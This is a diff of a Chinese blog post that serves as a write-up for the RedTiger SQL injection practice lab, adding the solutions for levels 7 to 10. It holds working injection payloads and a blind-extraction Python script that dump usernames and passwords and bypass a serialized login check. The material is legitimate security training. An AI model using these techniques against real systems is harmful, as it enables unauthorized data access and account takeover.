@@ -23,7 +23,11 @@
 <meta property="og:image" content="https://i.loli.net/2019/08/31/F8A95nBoMZjbmy2.png">
 <meta property="og:image" content="https://i.loli.net/2019/08/31/qDwBgu7NchstfRW.png">
 <meta property="og:image" content="https://i.loli.net/2019/08/31/EgvVXBN3sUc5wIH.png">
-<meta property="og:updated_time" content="2019-08-31T13:10:24.697Z">
+<meta property="og:image" content="https://i.loli.net/2019/09/01/vDuVhTFgGJW1zKM.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/01/T5W9IB8AhcKOJso.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/01/Jwxq2NuCVyGR3Ij.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/01/Jo4Hckzd7gp8SWM.png">
+<meta property="og:updated_time" content="2019-09-01T03:23:42.586Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="redtiger-wp">
 <meta name="twitter:description" content="昨天赵哥在群里问有没有web手帮他测测题目难度，我闲来无事。。。拿到题目后发现是sql注入，之后手注了半天也没结果，总觉得自己思路不清晰，需要整理自己的sql注入，在整理个字典，网上的字典总是用不惯 正好有个redtiger（红牛？？？）的sql注入练习网站，题量也不多，一共10题，边做边积累😋">
@@ -179,7 +183,6 @@
       
         <meta name="referrer" content="no-referrer">
 
-
 <blockquote>
 <p>昨天赵哥在群里问有没有web手帮他测测题目难度，我闲来无事。。。拿到题目后发现是sql注入，之后手注了半天也没结果，总觉得自己思路不清晰，需要整理自己的sql注入，在整理个字典，网上的字典总是用不惯</p>
 <p>正好有个redtiger（红牛？？？）的sql注入练习网站，题量也不多，一共10题，边做边积累😋</p>
@@ -290,7 +293,7 @@
 
 <p>写个脚本，记个笔记，这里一定要加上    <strong>cookie</strong>    😥，别问我怎么知道的</p>
 <blockquote>
-<p>对于这种明显有检查的，需要加上cookie</p>
+<p>对于这种明显有cookie检查的，需要加上cookie</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">url = &quot;http://redtiger.labs.overthewire.org/level4.php?id=&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">tmp = 0</span><br><span class="line">cookie =&#123;</span><br><span class="line">	&quot;level4login&quot;:&quot;put_the_kitten_on_your_head&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    if tmp == 1:</span><br><span class="line">        break</span><br><span class="line">    tmp = 1</span><br><span class="line">    for j in range(32,127):</span><br><span class="line">        payload = &quot;select keyword from level4_secret&quot;</span><br><span class="line">        #</span><br><span class="line">        id = &quot;1 and ascii(substr((&quot;+payload+&quot;),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot; #&quot;</span><br><span class="line">        print(id)</span><br><span class="line">        url2 = url+id</span><br><span class="line">        r=requests.get(url=url2,cookies=cookie)</span><br><span class="line">        if &quot;Query returned 1 rows.&quot; in r.content.decode(&quot;utf-8&quot;):</span><br><span class="line">            tmp = 0</span><br><span class="line">            flag=flag+chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
 
@@ -329,8 +332,76 @@
 <p>并且不能注释、substr、substring、ascii、mid、like</p>
 </blockquote>
 <p>只有一个搜索框，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">=&gt;正常</span><br><span class="line"></span><br><span class="line">1&apos;</span><br><span class="line">=&gt;提示语法错误</span><br><span class="line">An error occured!: </span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;%&apos; OR text.title LIKE &apos;%1&apos;%&apos;)&apos; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &apos;%1&apos;%&apos; OR text.title LIKE &apos;%1&apos;%&apos;)</span><br><span class="line"></span><br><span class="line">1-- </span><br><span class="line">=&gt;Some things are disabled!说明被禁用</span><br><span class="line">使用能替换%20，用bp测试一下</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">=&gt;正常</span><br><span class="line"></span><br><span class="line">1&apos;</span><br><span class="line">=&gt;提示语法错误</span><br><span class="line">An error occured!: </span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;%&apos; OR text.title LIKE &apos;%1&apos;%&apos;)&apos; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &apos;%1&apos;%&apos; OR text.title LIKE &apos;%1&apos;%&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在意料之中是like注入，用%可以查出全部数据</span><br><span class="line">%</span><br><span class="line">=&gt;	显示了3条数据。。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">like注入需要想办法闭合，三种方式（#		--	 	/**/）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1%&apos;)#</span><br><span class="line">=&gt;Some things are disabled!说明被禁用</span><br><span class="line"></span><br><span class="line">1%&apos;)-- </span><br><span class="line">抓包得到：search=1%25%27--+&amp;dosearch=search%21	发现被url编码，利用bp爆破一下</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://i.loli.net/2019/09/01/vDuVhTFgGJW1zKM.png" alt="Snipaste_2019-09-01_08-54-48.png"></p>
+<p>发现%a0的时候能成功闭合，当然不止%a0，从00-ff，后面还有很多</p>
+<p>既然能成功闭合，构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1%25%27)%20union select 1,2,3--%a0</span><br><span class="line">=&gt;An error occured!:The used SELECT statements have a different number of columns</span><br><span class="line"></span><br><span class="line">search=%25%27)%20union select 1,2,3,4--%a0&amp;dosearch=search%21</span><br><span class="line">=&gt;回显正常，说明字段数为4</span><br><span class="line"></span><br><span class="line">search=ggg%25%27)%20union select 1,2,3,4--%a0&amp;dosearch=search%21</span><br><span class="line">=&gt;回显4，3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">search=ggg%25%27)%20union select 1,2,autor,4 from level7_news--%a0&amp;dosearch=search%21</span><br><span class="line">=&gt;爆出了全部用户</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/01/T5W9IB8AhcKOJso.png" alt="Snipaste_2019-09-01_09-16-03.png"></p>
+<p>其中第三个    TestUserforg00gle    比较像，提交成功👌</p>
+<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><blockquote>
+<p>目标是得到Admin用户的密码</p>
+</blockquote>
+<p>简单分析，应该是update操作，猜测后台语句是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set email=&apos;&apos;,name=&apos;&apos;,icq=&apos;&apos;,age=&apos;&apos; where username=&apos;admin&apos;</span><br></pre></td></tr></table></figure>
+
+<p>开始尝试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email=1&apos;#</span><br><span class="line">=&gt;error in SQL syntax;		icq = &apos;1&apos;, age = &apos;25&apos; WHERE id = 1</span><br></pre></td></tr></table></figure>
+
+<p>语句为，和预期的差不多</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set email=&apos;&apos;,name=&apos;&apos;,icq=&apos;&apos;,age=&apos;&apos; where id=1</span><br></pre></td></tr></table></figure>
+
+<p>将password的值付给其中某个值即可，但是我们只知道icq字段和age字段，以及他们的顺序，理论上应该从age入手并读icq赋值，但是age应该被设置了int类型，因此只能从icq入手，这又要求必须赋值前两个字段，猜测是email和name</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">update users set email=&apos;&apos;,name=&apos;&apos;,icq=&apos;&apos;,email=password,icq=&apos;1&apos;,age=&apos;1&apos; where id=1</span><br><span class="line">=&gt; &apos;,email=pass</span><br><span class="line">应该是被限制了长度，只能从name或者email入手</span><br><span class="line"></span><br><span class="line">update users set email=&apos;&apos;,name=password,email=&apos;1&apos;,name=&apos;&apos;,icq=&apos;&apos;,age=&apos;1&apos; where id=1</span><br><span class="line">=&gt;成功！！！😁</span><br><span class="line">那么再试试从name入手</span><br><span class="line"></span><br><span class="line">update users set email=&apos;&apos;,name=&apos;&apos;,email=password,name=&apos;1&apos;,icq=&apos;&apos;,age=&apos;1&apos; where id=1</span><br><span class="line">=&gt;失败</span><br><span class="line">感觉是没有被解析。。具体原因是啥不太清楚。name的值&apos;,email=password,name=&apos;1</span><br></pre></td></tr></table></figure>
+
+<p>提交第二次成功的结果    19JPYS1jdgvkj    👌</p>
+<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><blockquote>
+<p>目标是得到所有用户的账号密码，表名是level9_users</p>
+</blockquote>
+<p>简单分析，应该是insert into操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table(author,title,text) values(&apos;&apos;,&apos;&apos;,&apos;&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>可以利用多次插入的方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">insert into table(author,title,text) values(&apos;&apos;,&apos;&apos;,&apos;&apos;),(&apos;&apos;,&apos;&apos;,&apos;&apos;)#&apos;)</span><br><span class="line">尝试构造</span><br><span class="line">insert into table(author,title,text) values(&apos;1&apos;,&apos;2&apos;,&apos;3&apos;),((select database()),&apos;&apos;,&apos;&apos;)#</span><br><span class="line">=&gt;成功得到数据库名</span><br><span class="line"></span><br><span class="line">insert into table(author,title,text) values(&apos;1&apos;,&apos;2&apos;,&apos;3&apos;),((select username from level9_users),(select password from level9_users),&apos;&apos;)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/01/Jwxq2NuCVyGR3Ij.png" alt="Snipaste_2019-09-01_10-39-17.png"></p>
+<p>登录即可✌</p>
+<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><blockquote>
+<p>目标是login as TheMaster</p>
+</blockquote>
+<p>简单分析，只有一个Login按钮，点击登录，提示</p>
+<p>Welcome Monkey. You are just a normal user!</p>
+<p>查看源代码，发现有一个隐藏的input，并且值被base64加密，解码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ok，反序列化看看是啥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  &apos;username&apos; =&gt;</span><br><span class="line">  string(6) &quot;Monkey&quot;</span><br><span class="line">  &apos;password&apos; =&gt;</span><br><span class="line">  string(12) &quot;0815password&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用万能密码试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">something</span><br><span class="line">&apos;or &apos;1&apos;=&apos;1</span><br><span class="line">=&gt;YToyOntzOjg6InVzZXJuYW1lIjtzOjA6IiI7czo4OiJwYXNzd29yZCI7czoxMDoiJ29yICcxJz0nMSI7fQ==	</span><br><span class="line">失败</span><br></pre></td></tr></table></figure>
+
+<p>猜测可能是分开判断的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select password from users where username=&apos;&apos;</span><br><span class="line">if(password=&apos;&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>又想到要求以TheMaster登录，先试试联合注入能不能爆库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Monkey&apos;order by 1#</span><br><span class="line">0815password</span><br><span class="line">=&gt;YToyOntzOjg6InVzZXJuYW1lIjtzOjE4OiJNb25rZXknb3JkZXIgYnkgMSMiO3M6ODoicGFzc3dvcmQiO3M6MTI6IjA4MTVwYXNzd29yZCI7fQ==</span><br><span class="line">再次失败</span><br></pre></td></tr></table></figure>
+
+<p>思路就断了。。。。。。</p>
+<p>后来看了一些wp，猜测后台语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select username,password from users where username=$username and password=$password&quot;;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if($result) &#123;</span><br><span class="line">    $row = mysql_fetch_row($result);</span><br><span class="line">    echo $row[&quot;username&quot;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;error&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只需要result存在即可，将password改成boolean类型的true，就可以绕过检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TheMaster</span><br><span class="line">true</span><br><span class="line">=&gt;YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/09/01/Jo4Hckzd7gp8SWM.png" alt="Snipaste_2019-09-01_11-17-35.png"></p>
+<p>成功！！👌</p>
+<blockquote>
+<p>感觉最后一题的思路应该挺实用的，但是我的万能密码为啥不行😥</p>
+</blockquote>
+<h3 id="题目地址："><a href="#题目地址：" class="headerlink" title="题目地址："></a>题目地址：</h3><p><a href="http://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org/</a></p>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://blog.spoock.com/2016/07/25/redtiger-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2016/07/25/redtiger-writeup/</a></p>
 
       
 
